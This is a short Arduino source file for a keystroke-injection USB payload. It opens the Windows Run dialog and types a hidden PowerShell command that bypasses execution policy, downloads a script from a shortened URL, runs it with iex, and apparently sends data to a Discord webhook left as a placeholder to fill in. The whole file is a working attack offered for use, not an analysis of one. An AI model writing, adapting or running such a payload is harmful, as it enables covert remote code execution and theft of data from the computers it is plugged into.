#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);

  Keyboard.print("powershell -W h -NonI -NoP -Ep bypass -c \"$dc = '<Your discord webhook here>'; irm https://shorturl.at/blvGV | iex\"");

  delay(200);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
}
